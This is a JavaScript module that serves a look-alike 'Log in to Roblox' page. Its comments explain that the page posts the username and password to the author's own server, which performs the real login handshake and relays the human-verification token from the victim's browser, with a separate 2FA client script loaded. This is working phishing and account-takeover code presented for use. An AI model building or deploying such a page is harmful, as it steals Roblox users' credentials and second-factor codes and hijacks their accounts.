// Our own sign-in page. Not Roblox's proxied one.
// The browser posts here; the server runs the handshake; a human check renders
// in the visitor's own browser and relays its token back.

function escapeHtml(value) {
    return String(value === undefined || value === null ? '' : value)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

const STYLE = `
*{box-sizing:border-box}
body{margin:0;min-height:100vh;background:#121215;color:#fff;
font:16px/1.4 "Builder Sans","Helvetica Neue",Arial,sans-serif;
display:flex;align-items:center;justify-content:center;padding:24px}
.card{width:100%;max-width:404px;background:#1c1e21;border:1px solid #2f3134;
border-radius:12px;padding:32px 28px}
h1{margin:0 0 6px;font-size:24px;font-weight:600}
.sub{margin:0 0 18px;color:#a1a5ab;font-size:14px}
label{display:block;font-size:13px;color:#c3c7cd;margin:14px 0 6px}
input{width:100%;height:46px;background:#111315;border:1px solid #3a3d41;
border-radius:8px;color:#fff;padding:0 12px;font-size:15px;outline:none}
input:focus{border-color:#00a2ff}
button{width:100%;height:46px;margin-top:22px;border:0;border-radius:8px;
background:#00a2ff;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
button:disabled{opacity:.6;cursor:default}
.err{min-height:20px;margin-top:14px;color:#ff5c5c;font-size:14px}
`;

function authPage(req, res) {
    const returnUrl = escapeHtml(typeof req.query.returnUrl === 'string' ? req.query.returnUrl : '');
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Log in to Roblox</title>
<style>${STYLE}</style>
</head>
<body>
<form class="card" id="form" autocomplete="on" novalidate>
  <h1>Log in</h1>
  <p class="sub">Use your Roblox account.</p>
  <label for="u">Username or email</label>
  <input id="u" name="username" type="text" autocomplete="username" autocapitalize="off" spellcheck="false" required>
  <label for="p">Password</label>
  <input id="p" name="password" type="password" autocomplete="current-password" required>
  <button id="go" type="submit">Log In</button>
  <div class="err" id="err" role="alert"></div>
</form>
<input type="hidden" id="returnUrl" value="${returnUrl}">
<script src="/2fa-client.js" defer></script>
<script src="/login-client.js" defer></script>
</body>
</html>`;
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
    res.set('Pragma', 'no-cache');
    return res.type('text/html').send(html);
}

module.exports = { authPage };
